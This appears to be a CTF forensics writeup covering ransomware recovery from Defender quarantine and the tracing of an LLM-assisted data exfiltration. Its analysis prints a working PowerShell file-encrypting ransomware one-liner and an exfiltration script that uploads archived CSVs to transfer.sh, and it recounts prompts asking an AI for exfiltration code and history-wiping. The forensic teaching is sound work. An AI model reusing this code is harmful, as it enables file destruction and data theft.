---
title: "Black Hat MEA CTF Qualification 2026 — Forensics Writeup (Qfact & Whisper)"
date: 2026-09-04T10:00:00Z
lastmod: 2026-09-07T00:00:00Z
description: "Full step-by-step forensics writeup for Black Hat MEA CTF Qualification 2026. Covers Qfact (Defender quarantine extraction, HTA dropper reversal, AES-256-CBC decryption) and Whisper (Ollama LLM history forensics, BLAKE2b password trap, WinZip-AES recovery)."
summary: "Two DFIR challenges from BlackHat MEA CTF Quals 2026: Qfact requires recovering a ransomware dropper from Defender's quarantine store and decrypting 9 exfiltrated documents; Whisper traces a data-exfiltration script through Ollama prompt history, a GNOME Trash recovery, and a BLAKE2b password trap buried inside a WinZip-AES archive."
tags:
  - ctf
  - forensics
  - dfir
  - windows-forensics
  - linux-forensics
  - ransomware
  - defender-quarantine
  - llm-forensics
  - blackhat-mea
  - 2026
keywords:
  - "black hat mea ctf 2026 forensics"
  - "blackhat mea ctf qualification 2026 writeup"
  - "qfact ctf writeup"
  - "whisper ctf writeup"
  - "defender quarantine forensics"
  - "ollama llm forensics"
  - "winzip aes ctf"
  - "blake2b password trap"
  - "hta ransomware dfir"
  - "ctf forensics 2026"
categories:
  - CTF Writeups
author: "CyberSecurity Elite"
cover:
  image: "/images/articles/blackhat-mea-ctf-2026-quals-forensics-writeup.png"
  alt: "Black Hat MEA CTF Qualification 2026 Forensics writeup cover — Qfact Defender quarantine recovery and Whisper Ollama LLM forensics"
  relative: false
showToc: true
TocOpen: false
draft: false
---

## Overview

Black Hat MEA CTF Qualification 2026 shipped two Forensics / DFIR challenges. Both are story-driven triage packages where reading the brief is step zero — every artefact you need is named, just not handed to you. Neither requires specialised tooling: the entire solution set runs on stock Python 3 with no third-party packages.

| Challenge | Difficulty | Category | Flag |
|---|---|---|---|
| **Qfact** | ★★★★☆ | Forensics / DFIR (Windows) | `BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}` |
| **Whisper** | ★★★★☆ | Forensics / DFIR (Linux) | `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}` |

---

## Qfact

### Challenge Brief

> A finance employee's workstation was hit by ransomware. All documents were encrypted and a ransom note was left demanding payment in Bitcoin. The employee recalls opening a file they received via email. IT later removed some Defender exclusions during a security audit, and Defender flagged a suspicious file, but it was quarantined, not preserved on disk. A triage package has been collected. Recover the malicious file, figure out how the encryption works, and decrypt the affected files.

The phrase "not preserved on disk" is the whole roadmap. The only surviving copy of the malware is the one Microsoft Defender obfuscated and filed away in its quarantine store. Three problems are stacked in sequence:

1. **Reverse Defender's quarantine container format** to get the sample back.
2. **Reverse the sample** to recover the key schedule.
3. **Reconstruct the key and IV** from host artefacts and decrypt.

### Evidence

| | |
|---|---|
| Archive | `Evidence.zip` — 35,788,227 bytes |
| MD5 | `d93b512cf6437220e8a55553fba57f83` |
| SHA-256 | `e4281b854b50995bbb3b88b081ce81105a60c159737632791f2ade8e37f1259c` |

```
EncryptedFiles/     9 × *.enc  (Financial, Personal, Projects, Reports)
EventLogs/          Application, Defender-Operational, PowerShell-Operational,
                    Security, System, TerminalServices (.evtx)
Prefetch/           289 entries incl. MSHTA.EXE and 2 × POWERSHELL.EXE
Quarantine/
  Entries/{8003AEBB-0000-0000-8783-FBD9AB0CEF04}          396 B
  Resources/36/367F0894EA48CC0D7EFC919C5665F0E92D52352D   108 B
  ResourceData/36/367F0894EA48CC0D7EFC919C5665F0E92D52352D  4,769 B
Registry/           NTUSER.DAT, SOFTWARE, SYSTEM
READ_ME.txt         ransom note (UTF-16LE + BOM)
```

> **Extraction gotchas.** Some entries have no owner-read bit set, so the quarantine blobs come out unreadable. Run `chmod -R u+rwX` after unzipping. Windows-style backslash path separators can also cause issues on macOS — if you see single files with literal backslashes in their names, re-extract with `7z x` or Python's `zipfile`.

---

### Step 1 — Triage the Ransom Note

`READ_ME.txt` is UTF-16LE. Beyond the usual theatre it leaks one load-bearing fact:

```
Your Unique ID: LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A
```

The ID format is `LOCK-<COMPUTERNAME>-<USERNAME_PREFIX>-<date>-<constant>`. This gives us the hostname (`DESKTOP-KLPAT9O`) and a partial username (`JM` — uppercase first two chars). The date (`20260628`) timestamps the attack. Hold these values — they will hand us half of the IV once we see the dropper.

Also recorded: BTC address `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` and the C2 onion `drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au.onion`.

---

### Step 2 — Understand Defender's Quarantine Store

Everything under `%ProgramData%\Microsoft\Windows Defender\Quarantine\` is obfuscated with **RC4 under a static 256-byte key** that ships compiled into `mpengine.dll`. It is not a secret and has not changed in years — the same key appears in every public Defender quarantine tool. Three directories matter:

| Directory | Contents |
|---|---|
| `Entries\{GUID}` | Detection metadata: threat name, timestamp, original path |
| `ResourceData\XX\<SHA1>` | The quarantined file, wrapped in a container |
| `Resources\XX\<SHA1>` | A small back-reference record |

#### 2a. `ResourceData` — One Clean RC4 Stream

Decrypting the 4,769-byte blob as a single RC4 stream immediately yields structure:

```
00000000  03 00 00 00  02 00 00 00  ac 00 00 00  00 00 00 00
00000010  01 00 04 84 ...                      <- SECURITY_DESCRIPTOR (0xAC bytes)
000000c0  01 00 00 00 00 00 00 00  79 11 00 00 00 00 00 00
000000d0  00 00 00 00  3c 68 74 6d 6c 3e 0d 0a  <- "<html>" starts at 0xD4
```

| Offset | Field |
|---|---|
| `0x00` | Version `3` |
| `0x04` | Section count `2` |
| `0x08` | Security-descriptor length (`0xAC`) |
| `0x10` | The security descriptor |
| `0xC0` *(8-byte aligned)* | Stream count (QWORD = `1`) |
| `0xC8` | Stream length (QWORD = `0x1179` = 4,473 bytes) |
| `0xD0` | Stream-name length (DWORD = `0`) |
| `0xD4` | **The original file** |

**Sanity check.** Defender names each ResourceData file after a SHA-1 — but not the payload's SHA-1. It is the SHA-1 of the **decrypted container**:

```
SHA1(decrypted blob) = 367F0894EA48CC0D7EFC919C5665F0E92D52352D  == the filename
```

That single equality proves the RC4 key, the keystream alignment, and the decryption are all correct before a single byte of malware is interpreted.

#### 2b. `Entries` — Three Independent RC4 Streams (the Trap)

Decrypting the 396-byte entry as one stream only makes sense for the first `0x30` bytes. Everything after is noise. The file is **three separate RC4 streams laid end to end, each restarting the keystream from byte 0**:

```
[ 0x00 .. 0x3C )  header     -> lengths of the next two sections at +0x28 / +0x2C
[ 0x3C .. 0x84 )  section 1  -> 0x48 bytes: GUID, FILETIME, threat name
[ 0x84 .. 0x18C ) section 2  -> 0x108 bytes: original path(s), UTF-16LE
```

Decrypted section 1:

```
0000  bb ae 03 80 00 00 00 00 87 83 fb d9 ab 0c ef 04  <- {8003AEBB-…-FBD9AB0CEF04}
0020  56 c3 d4 5f dc 06 dd 01                          <- FILETIME (2026-06-28 08:59:06)
0030  01 00 00 00 54 72 6f 6a 61 6e 3a 4a 53 2f 46 6c  <- Trojan:JS/Fl
0040  61 66 69 73 69 2e 43 00                          <- afisi.C
```

Section 2 yields the original path: `\\?\C:\DevTools\Q3_Financial_Review.hta`.

Running the extractor confirms everything:

```bash
$ python3 solve/extract_quarantine.py Evidence/Quarantine -o recovered/
[entry] {8003AEBB-0000-0000-8783-FBD9AB0CEF04}
        threat      : Trojan:JS/Flafisi.C
        quarantined : 2026-06-28 08:59:06.133384 UTC
        origin      : \\?\C:\DevTools\Q3_Financial_Review.hta
        origin      : C:\DevTools\Q3_Financial_Review.hta
[data ] 367F0894EA48CC0D7EFC919C5665F0E92D52352D
        container sha1 matches name : True
        payload size   : 4473
        payload md5    : 1a4803df55d66440858ce9699edf125b
        payload sha256 : 4f8fab2ca63a0313edf0a1190071d4d946cf0b90c27046e9fb9e5e84056145b0
```

`C:\DevTools\` — exactly the path that was in the Defender exclusions list, which is why the malware ran unchallenged.

---

### Step 3 — The Recovered Sample

4,473 bytes of HTML Application. The lure is a fake "Q3 Financial Review — Loading" page. The payload lives in `Window_OnLoad`, which builds its passphrase one character at a time to evade string scanning:

```vbscript
k = Chr(70) & Chr(120) & Chr(55) & Chr(109) & Chr(75)   ' F x 7 m K
k = k & Chr(57) & Chr(118) & Chr(76) & Chr(50) & Chr(110) ' 9 v L 2 n
k = k & Chr(81) & Chr(52) & Chr(119) & Chr(80) & Chr(122) ' Q 4 w P z
k = k & Chr(33)                                            ' !
```

→ **`Fx7mK9vL2nQ4wPz!`**

It launches PowerShell hidden:

```vbscript
CreateObject("WScript.Shell").Run _
  "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command """ & ps & """", 0, True
```

The PowerShell payload:

```powershell
$ErrorActionPreference='SilentlyContinue';
$p='Fx7mK9vL2nQ4wPz!';
$d=[Environment]::GetFolderPath('MyDocuments');
$kb=[System.Text.Encoding]::UTF8.GetBytes($p.PadRight(32).Substring(0,32));
$ivSeed=$env:COMPUTERNAME+$env:USERNAME;
$md5=[Security.Cryptography.MD5]::Create();
$iv=$md5.ComputeHash([Text.Encoding]::UTF8.GetBytes($ivSeed));
gci $d -File -Recurse|%{
  $c=[IO.File]::ReadAllBytes($_.FullName);
  $a=[Security.Cryptography.Aes]::Create();
  $a.Key=$kb; $a.IV=$iv; $a.Mode=0; $a.Padding=2;
  $e=$a.CreateEncryptor();
  $enc=$e.TransformFinalBlock($c,0,$c.Length);
  [IO.File]::WriteAllBytes($_.FullName+'.enc',$enc);
  ri $_.FullName -Force; $a.Dispose()};
```

The ransom ID builder also confirms the hostname and partial username:

```powershell
$u='LOCK-'+$env:COMPUTERNAME+'-'+$env:USERNAME.Substring(0,2).ToUpper()+'-'+(Get-Date -Format 'yyyyMMdd')+'-7F3A'
```

---

### Step 4 — Recovering the Key and IV

#### The Key

```
"Fx7mK9vL2nQ4wPz!".PadRight(32).Substring(0,32)
  = "Fx7mK9vL2nQ4wPz!" + 16 spaces
  = 4678376d4b39764c326e513477507a2120202020202020202020202020202020
```

32 bytes → **AES-256**. Note the sloppiness: 128 bits of the key are literally `0x20` (ASCII space) padding.

#### The IV

```
iv = MD5(UTF8($env:COMPUTERNAME + $env:USERNAME))
```

Both values come straight from the triage package:

- **COMPUTERNAME** — `DESKTOP-KLPAT9O`, from `SYSTEM\ControlSet001\Control\ComputerName` and confirmed throughout the event logs.
- **USERNAME** — The ransom note gave us `JM` (first two chars, uppercased). The SOFTWARE hive's `ProfileList` key resolves it to `jmartin` (`C:\Users\jmartin`).

```
MD5("DESKTOP-KLPAT9O" + "jmartin") = a31de3916e88f240c2bf08735b965aa9
```

#### The Mode Trap — the Actual Challenge

```powershell
$a.Mode=0
```

`0` is **not a valid `System.Security.Cryptography.CipherMode`** (CBC=1, ECB=2, OFB=3, CFB=4, CTS=5). The property setter validates its input and **throws**. But `$ErrorActionPreference='SilentlyContinue'` swallows the exception, the assignment never lands, and the `Aes` object silently keeps its **default mode — CBC.**

`$a.Padding=2` is `PKCS7` (also the default), so that assignment does nothing either.

Real scheme: **AES-256-CBC + PKCS#7** — not ECB.

Reading `Mode=0` as "ECB" is the intended dead end: every file will fail to unpad. Two independent proofs that CBC is right:

- All 9 files carry valid PKCS#7 padding after CBC decryption (a ~1-in-256 accident per file under the wrong mode, so 9-for-9 is conclusive).
- The first block — the one CBC XORs with the IV — decrypts correctly, which only happens if the IV is right too.

---

### Step 5 — Decrypt All Files

```python
#!/usr/bin/env python3
# derive key and IV, then AES-256-CBC decrypt each *.enc file

import hashlib

PASSPHRASE    = "Fx7mK9vL2nQ4wPz!"
COMPUTERNAME  = "DESKTOP-KLPAT9O"
USERNAME      = "jmartin"

key = PASSPHRASE.ljust(32)[:32].encode("utf-8")
iv  = hashlib.md5(f"{COMPUTERNAME}{USERNAME}".encode("utf-8")).digest()

print(f"key : {key.hex()}")
print(f"iv  : {iv.hex()}")
# key : 4678376d4b39764c326e513477507a2120202020202020202020202020202020
# iv  : a31de3916e88f240c2bf08735b965aa9
```

Running the full script:

```bash
$ python3 solve/decrypt_files.py Evidence/EncryptedFiles -o decrypted/ \
      --computername DESKTOP-KLPAT9O --username jmartin

key (hex) : 4678376d4b39764c326e513477507a2120202020202020202020202020202020
iv  (hex) : a31de3916e88f240c2bf08735b965aa9

[ ok ] Financial/Q3_auth_memo.txt.enc     ->  decrypted/Financial/Q3_auth_memo.txt     (1412 bytes)
[ ok ] Financial/Q3_forecast.csv.enc      ->  decrypted/Financial/Q3_forecast.csv      (2622 bytes)
[ ok ] Financial/budget_2025.csv.enc      ->  decrypted/Financial/budget_2025.csv      (1976 bytes)
[ ok ] Financial/vendor_payments.csv.enc  ->  decrypted/Financial/vendor_payments.csv  (3037 bytes)
[ ok ] Personal/notes.txt.enc             ->  decrypted/Personal/notes.txt              (100 bytes)
[ ok ] Projects/timeline.txt.enc          ->  decrypted/Projects/timeline.txt           (206 bytes)
[ ok ] Reports/budget_meeting.txt.enc     ->  decrypted/Reports/budget_meeting.txt      (242 bytes)
[ ok ] Reports/it_request.txt.enc         ->  decrypted/Reports/it_request.txt          (158 bytes)
[ ok ] Reports/standup_notes.txt.enc      ->  decrypted/Reports/standup_notes.txt       (250 bytes)

9/9 files recovered
```

The solve script uses a dependency-free AES-256-CBC implementation (`miniaes.py`), so it reproduces on any stock Python 3 installation. Output is byte-identical to `openssl enc -d -aes-256-cbc -K <key> -iv <iv>`.

---

### Step 6 — The Flag

`Financial/Q3_auth_memo.txt` is a fake CFO memo carrying a "master authorization code":

```
The master authorization code for the Q3 financial reporting
portal has been encoded below for secure internal transmission:

QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9
```

```bash
$ echo 'QkhGbGFnWXtkM2YzbmQzcl9xdTRyNG50MW4zX3IzYzB2M3J5XzIwMjZ9' | base64 -d
BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}
```

**Flag: `BHFlagY{d3f3nd3r_qu4r4nt1n3_r3c0v3ry_2026}`**

---

### Corroboration — The Incident Timeline

The event logs confirm every inference above. All times UTC.

| Time (UTC) | Source | EID | Event |
|---|---|---|---|
| 2026-06-26 16:59:33 | Defender | 5007 | Exclusion added: `Paths\C:\DevTools\` |
| 2026-06-28 08:08:40 | Defender | 5007 | Exclusion added: `Processes\mshta.exe` |
| 2026-06-28 08:08:42 | Defender | 5007 | Exclusion added: `Processes\powershell.exe` |
| 2026-06-28 08:10:00.943 | Security | 4688 | `mshta.exe "C:\DevTools\Q3_Financial_Review.hta"` — parent: `explorer.exe`, user: `jmartin` |
| 2026-06-28 08:10:01.506 | Security | 4688 | `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden …` |
| 2026-06-28 08:10:03.122 | PowerShell | 4104 | Script-block logging captures **full encryption one-liner in cleartext** |
| 2026-06-28 08:10:16.794 | Defender | 5007 | Security audit clears all three exclusions |
| 2026-06-28 08:58:33 | Defender | 1000 | Custom scan: `file:_C:\DevTools\Q3_Financial_Review.hta` |
| 2026-06-28 08:58:34.407 | Defender | 1116 | Detection: `Trojan:JS/Flafisi.C`, Severity: Severe |
| 2026-06-28 08:59:06.133 | Defender | 1117 | Action: **Quarantine** — `0x00000000 The operation completed successfully` |

The narrative reads cleanly: exclusions were pre-positioned two days before the attack, process exclusions for `mshta.exe` and `powershell.exe` were added ~90 seconds before execution, jmartin double-clicked the attachment from Explorer, encryption ran, the audit stripped the exclusions, and the next scan caught and quarantined the file — preserving the only surviving copy.

### Indicators of Compromise

| Type | Value |
|---|---|
| SHA-256 | `4f8fab2ca63a0313edf0a1190071d4d946cf0b90c27046e9fb9e5e84056145b0` |
| MD5 | `1a4803df55d66440858ce9699edf125b` |
| Path | `C:\DevTools\Q3_Financial_Review.hta` |
| Detection | `Trojan:JS/Flafisi.C` |
| BTC | `bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh` |
| C2 | `drkx7fq2cym3oa4rg6mv3wqj5hk2oiq4au[.]onion` |
| Ransom ID | `LOCK-DESKTOP-KLPAT9O-JM-20260628-7F3A` |
| Exclusions (added) | `C:\DevTools\`, `mshta.exe`, `powershell.exe` |

**ATT&CK chain:** T1566.001 → T1204.002 → T1218.005 → T1059.001 → T1562.001 → T1486

### Reproducing

```bash
unzip Evidence.zip -d Evidence
chmod -R u+rwX Evidence          # fix quarantine blob permissions

cd solve
python3 extract_quarantine.py ../Evidence/Quarantine -o ../recovered
python3 decrypt_files.py ../Evidence/EncryptedFiles -o ../out \
        --computername DESKTOP-KLPAT9O --username jmartin
grep -o '[A-Za-z0-9+/=]\{40,\}' ../out/Financial/Q3_auth_memo.txt | base64 -d

# optional: rebuild the incident timeline
python3 evtx_timeline.py ../Evidence/EventLogs DevTools Flafisi Exclusion mshta Fx7mK9
```

No third-party packages required.

---

## Whisper

### Challenge Brief

> A company's SOC team received a proxy alert after a developer's Linux workstation attempted to upload an encrypted file to an external file-sharing service. The developer claims they were just testing an AI tool for work. A forensic triage package has been collected from the workstation. Investigate the system, determine what AI tool was installed, what it was used for, and recover the data that was attempted to be exfiltrated.

Three questions, meant to be answered in order — each one hands you the key to the next:

1. **What AI tool?** → Ollama. It keeps a prompt-history file.
2. **What was it used for?** → The history is a written confession, including a passphrase.
3. **Recover the data.** → The passphrase does **not** open the archive. Find out why.

### Evidence

| | |
|---|---|
| Archive | `whisper_evidence.tar.zip` → `whisper_evidence.tar.gz` |
| Zip SHA-256 | `50e82592d55e12e452a87ddf8d59701e25366af3073a34d2aebe41573dfd2405` |
| Extracted | 505 MB, 14,072 entries |

```
whisper_evidence/
  data/reports/        4 × *.csv   business data
  home/dwright/        1,926 entries — the user profile
  journal_exports/     journalctl_{full,ollama,cron,ssh}.txt
  system_info/         24 × collector outputs
  tmp/                 34 entries (11 planted decoys — see Anti-forensics section)
  var/log/             audit/, auth.log, syslog, dpkg.log
```

Host details:

| | |
|---|---|
| Hostname | `dev-workstation` (VirtualBox VM) |
| OS | Ubuntu 24.04.4 LTS, kernel 6.17.0-35-generic |
| User | `dwright` (uid 1000) — "David Wright", `dwright@company.com` |
| Timezone | `Europe/Amsterdam` (CEST = UTC+2); **all timestamps below are UTC** |
| Collected | 2026-06-16 13:07 UTC |

---

### Step 0 — Start with the Audit Log

Before touching anything else: `var/log/audit/audit.log` and `audit.log.1` together hold 16 MB of `auditd` output with an `exec_log` rule that captures every `execve` with full `argv`. `~/.bash_history` is **0 bytes** — deliberate cleanup — so the audit log is the *only* complete command record.

```bash
grep -ah 'type=EXECVE' var/log/audit/audit.log* \
  | sed 's/.*argc=[0-9]* //' | awk '{print $1}' | sort | uniq -c | sort -rn
```

```
5501 a0="mkdir"    2078 a0="cp"       2042 a0="cut"    2032 a0="du"
 377 a0="cat"        58 a0="/bin/sh"    22 a0="rm"       21 a0="sudo"
   7 a0="/usr/local/lib/ollama/llama-server"
   5 a0="/usr/bin/python3"
   4 a0="/usr/local/bin/ollama"
   3 a0="ollama"
   3 a0="curl"
```

The `mkdir/cp/du/cut` mass (12,000+ records) is the triage collector itself. Drop those and ~300 distinct command lines remain. Filter for the tool name, the interpreter, and the data paths and you are down to the two dozen that make the case.

---

### Step 1 — What AI Tool Was Installed

Ollama does not appear in `dpkg` or `pip` — it installs via `curl | sh`. The audit log catches the whole installation:

```
2026-06-16 11:54:37  curl -fsSL https://ollama.com/install.sh
2026-06-16 11:54:38  curl --fail … https://ollama.com/download/ollama-linux-amd64.tar.zst
2026-06-16 11:54:38  tar -xf - -C /usr/local
2026-06-16 11:57:30  useradd -r -s /bin/false -U -m -d /usr/share/ollama ollama
2026-06-16 11:57:30  tee /etc/systemd/system/ollama.service
2026-06-16 11:57:30  systemctl enable ollama
2026-06-16 11:57:32  /usr/local/bin/ollama serve
2026-06-16 11:58:32  ollama pull tinyllama
2026-06-16 11:59:58  ollama run tinyllama
```

Three confirmations it was still live at collection time:

```
system_info/running_services.txt : ollama.service  loaded active running  Ollama Service
system_info/network_sockets.txt  : tcp LISTEN 127.0.0.1:11434  users:(("ollama",pid=6988,fd=3))
system_info/process_list.txt     : ollama  6988  /usr/local/bin/ollama serve
```

The Ollama journal pins version and model:

```
Listening on 127.0.0.1:11434 (version 0.30.8)
llama_model_loader: - kv 1: general.name str = TinyLlama
llama.context_length u32 = 2048
inference compute id=cpu … total="3.8 GiB"
```

Usage volume from the Gin access log:

```bash
grep -o 'POST *"/api/[a-z]*"' journal_exports/journalctl_ollama.txt | sort | uniq -c
# 17 POST "/api/chat"   <- interactive session
#  1 POST "/api/generate"
#  1 POST "/api/pull"
#  2 POST "/api/show"
```

17 chat completions between **12:01:08 and 12:45:38 UTC**.

> **Answer 1: Ollama 0.30.8, running `tinyllama` locally on CPU, bound to loopback only.**

---

### Step 2 — What It Was Used For

`ollama run` is a readline REPL. Like every readline REPL, it persists its input history to disk in **cleartext**:

```
home/dwright/.ollama/history   (mtime 2026-06-16 12:57:59 UTC)
```

The mtime is after the last chat completion at 12:45:38, and the audit log explains why — the user opened the file after the session ended (then tried to edit it):

```
2026-06-16 12:55:12  nano /home/dwright/.ollama/history
2026-06-16 12:56:38  cat  /home/dwright/.ollama/history
2026-06-16 12:56:50  nano /home/dwright/.ollama/history
```

64 lines total. About 60 are exactly what the developer's cover story predicts: logging config, FastAPI middleware, OpenTelemetry, postgres pooling, GitHub Actions caching. Boring and plausible. Then lines 33–38:

```
33  how do I create a password protected zip archive using pyzipper
34  write a python script that reads all csv files from a directory and creates an AES encrypted zip archive
35  use the password Gr33nF0x42!D1amond
36  also upload the archive to a remote server using requests and delete the script after successful execution
37  how do I derive an encryption key from a passphrase using hashlib sha256
38  how to clean the bash history in terminal so there are no traces
```

Six consecutive lines describing: collection → encryption → exfiltration → anti-forensics. And the passphrase is in cleartext on line 35.

Line 38 is the one that decides the whole case. Asking a model to write a CSV-archiving script is defensible. Asking *in the same session* how to erase your shell history afterwards is not something you do by accident.

> **Answer 2: to write a data-collection and exfiltration tool — and ask how to cover the tracks in the same session.**

Corroboration: pip's HTTP cache under `~/.cache/pip/http-v2/` still holds the downloaded wheels:

```
pyzipper-0.4.0, pycryptodomex-3.23.0, requests-2.34.2,
urllib3-2.7.0, certifi-2026.5.20, charset_normalizer-3.4.7, idna-3.18
```

`pyzipper` and `requests` — exactly the two libraries lines 33 and 36 called for.

---

### Step 3 — Recovering the Deleted Script

The audit log traces the full lifecycle:

```
2026-06-16 12:58:20  python3 -m venv /home/dwright/.local/share/.venv
2026-06-16 12:59:43  python /home/dwright/cache_mgr.py
2026-06-16 13:00:57  mv /home/dwright/cache_mgr.py /home/dwright/.local/share/Trash/files/cache_mgr.py
```

Two things stand out:

**The venv is hidden.** `~/.local/share/.venv` — a dotted directory in `~/.local/share`, where nobody scrolls. That is why `pip3 list` on the system interpreter shows nothing unusual.

**"Delete" meant `mv` to Trash.** The script told the LLM to delete the file after execution. What actually happened was a GNOME Trash move — the file is still on disk byte-for-byte. The `.trashinfo` file confirms everything:

```
~/.local/share/Trash/info/cache_mgr.py.trashinfo
[Trash Info]
Path=/home/dwright/cache_mgr.py
DeletionDate=2026-06-16T13:02:46
```

Out of 59 trashed items (58 from June 2025, routine housekeeping), this was the **only item trashed in 2026** — and it came from `$HOME` directly, on the day of the incident. It falls straight out of a date sort.

#### The Exfil Script (`cache_mgr.py`)

```python
#!/usr/bin/env python3
"""Cache management utility."""
import os, sys, glob, hashlib

sys.path.insert(0, os.path.expanduser("~/.local/share/.venv/lib/python3.12/site-packages"))
import pyzipper

raw_key = os.environ.get("CACHE_KEY", "")
if not raw_key:
    sys.exit(1)

# Derive actual encryption key from the raw passphrase
ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20].encode()

DATA_DIR    = os.path.join("/data", "reports")
CACHE_DIR   = os.path.join(os.path.expanduser("~"), ".cache", "fontconfig")
OUTPUT_PATH = os.path.join(CACHE_DIR, "session.zip")

def collect_and_archive():
    os.makedirs(CACHE_DIR, exist_ok=True)
    csv_files = glob.glob(os.path.join(DATA_DIR, "*.csv"))
    with pyzipper.AESZipFile(OUTPUT_PATH, 'w', compression=pyzipper.ZIP_DEFLATED,
                             encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(ARCHIVE_PASSWORD)
        for fp in csv_files:
            zf.write(fp, os.path.basename(fp))
    return OUTPUT_PATH

def upload(filepath):
    try:
        import requests
        with open(filepath, 'rb') as f:
            requests.put("https://transfer.sh/backup.zip", data=f,
                         headers={"Content-Type": "application/octet-stream"}, timeout=30)
    except:
        pass
```

Everything the brief described: `/data/reports/*.csv` swept up, WinZip-AES archive written to `~/.cache/fontconfig/` (masquerading as a font cache), `PUT` to a public file-sharing host. The bare `except: pass` means the upload can fail silently — and it did, leaving the archive on disk for us to recover.

---

### Step 4 — The Archive and the Password Trap

```
home/dwright/.cache/fontconfig/session.zip   291,118 bytes
SHA-256: 67cc96630e8ab5112ec25c2467481d361c7bcc2373ec0ec5da0417c26506b23d
```

A single non-font file in a font cache directory is already anomalous. The WinZip-AES format encrypts data but not filenames, so the central directory lists members in the clear:

```
customers_2025.csv         805,332 B
employee_directory.csv     192,509 B
internal_api_keys.csv        4,704 B   <-- not in /data/reports
revenue_q3.csv              39,861 B
vendor_contracts.csv         1,077 B
```

**Five members; `/data/reports/` only has four.** The audit log closes the gap:

```
2026-06-16 12:59:43  python /home/dwright/cache_mgr.py      <- archives 5 CSVs
2026-06-16 13:00:43  rm -f /data/reports/internal_api_keys.csv  <- deletes the 5th
```

Archived first, hard-deleted from disk one minute later. **The only surviving copy of `internal_api_keys.csv` is the encrypted one inside `session.zip`.** That is the challenge in one sentence.

#### The Trap

```bash
$ 7z x -p'Gr33nF0x42!D1amond' session.zip
ERROR: Wrong password : customers_2025.csv
```

Line 37 of the history (`how do I derive an encryption key from a passphrase using hashlib sha256`) points at SHA-256 — a deliberate red herring. The user asked for SHA-256; the model returned BLAKE2b; the user pasted it without reading.

```python
ARCHIVE_PASSWORD = hashlib.blake2b(raw_key.encode(), digest_size=32).hexdigest()[:20].encode()
```

**BLAKE2b** — not SHA-256. Digest size 32 bytes, rendered as 64 hex characters, then truncated to the first **20**. Three places to get wrong, which is the point.

```
passphrase : Gr33nF0x42!D1amond
blake2b-256: d571fe77618f54b7fca8a4912d0800b75218b69232cd8b34458a4d9f6c34d3eb
password   : d571fe77618f54b7fca8
```

**Rule:** the prompt history records what the user asked for, not what they got. An LLM is not a compiler. When the recovered artefact contradicts the prompt that produced it, the artefact wins.

#### WinZip-AES internals

Worth reading the container before trusting a tool:

```
extra field 0x9901 = AE-2, AES-256, Deflate
CRC-32 fields in central directory: 0x00000000 (all five members)
```

**AE-2** zeroes CRC-32 by spec and uses a truncated `HMAC-SHA1` over the ciphertext for integrity instead. Any solver that checks CRC will report false failure on a correct decrypt.

Key material: `PBKDF2-HMAC-SHA1(password, salt, 1000, 2×32+2)` → 32-byte AES key ‖ 32-byte HMAC key ‖ 2-byte verifier. Cipher: AES-256-CTR with **little-endian counter starting at 1** (not 0, not big-endian — both are easy ways to produce plausible-looking garbage).

---

### Step 5 — Decrypt and Find the Flag

```bash
$ cd solve && python3 solve.py ../artifacts/session.zip -o ../recovered
passphrase      : Gr33nF0x42!D1amond
blake2b-256     : d571fe77618f54b7fca8a4912d0800b75218b69232cd8b34458a4d9f6c34d3eb
archive password: d571fe77618f54b7fca8   (first 20 hex chars)

[ ok ] customers_2025.csv       AES-256  805332 B  hmac verified  -> recovered/
[ ok ] employee_directory.csv   AES-256  192509 B  hmac verified  -> recovered/
[ ok ] internal_api_keys.csv    AES-256    4704 B  hmac verified  -> recovered/
[ ok ] revenue_q3.csv           AES-256   39861 B  hmac verified  -> recovered/
[ ok ] vendor_contracts.csv     AES-256    1077 B  hmac verified  -> recovered/

5/5 members recovered
```

`internal_api_keys.csv` is 39 rows of production and staging credentials across 30 services. Every key is base64-encoded. Every row decodes to a plausible fake credential except one — the `master_vault` row owned by `vault_root`:

```csv
master_vault,QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==,...
```

```bash
$ echo 'QkhGbGFnWXtsMGM0bF8wbGw0bTRfbGxtX2Y0cjNuNTFjNV8yMDI2fQ==' | base64 -d
BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}
```

**Flag: `BHFlagY{l0c4l_0ll4m4_llm_f4r3n51c5_2026}`**

---

### Step 6 — Anti-forensics and What Survived It

Line 38 was acted on. Here is every cleanup technique used, and why none of it worked:

| Technique | Evidence | Why it failed |
|---|---|---|
| Shell history wiped | `~/.bash_history` is **0 bytes** | `auditd` was logging every `execve` with `exec_log` rule. Clearing bash's copy removes one record, not the record itself. |
| Script "deleted" | `mv` to `~/.local/share/Trash/files/` | A GNOME Trash move preserves the file, its original path, and a deletion timestamp. The timestamp made it the standout item in a 59-entry Trash sorted by date. |
| Archive disguised | `~/.cache/fontconfig/session.zip` | Font caches contain `.cache` files, not zips. Wrong file type in a well-known directory is louder than an odd filename somewhere unremarkable. |
| Hidden venv | `~/.local/share/.venv` (dotted directory) | pip's HTTP cache at `~/.cache/pip/http-v2/` kept all downloaded wheels, naming `pyzipper` and `requests` outright. |
| Decoy files | 11 × `/dev/urandom` dumps into `/tmp` at 13:00:48 UTC | All created in one batch in the same second, every one `bs=1024` with a round count. Each `dd` command line is in the audit log with its exact output path. |

#### Timestamp Forgery

`session.zip`'s own mtime and its five member timestamps all read **2026-06-20 ~15:42–15:45 CEST** — four days after the incident. The containing directory `~/.cache/fontconfig/` has mtime **2026-06-16 12:59:43 UTC**, matching the audit log's `python cache_mgr.py` call to the second. Directory mtimes update on file creation and are not what a naive timestomp touches. The pair (directory mtime + audit log) is the trustworthy one; the archive's own internal timestamps are forged.

### Incident Timeline

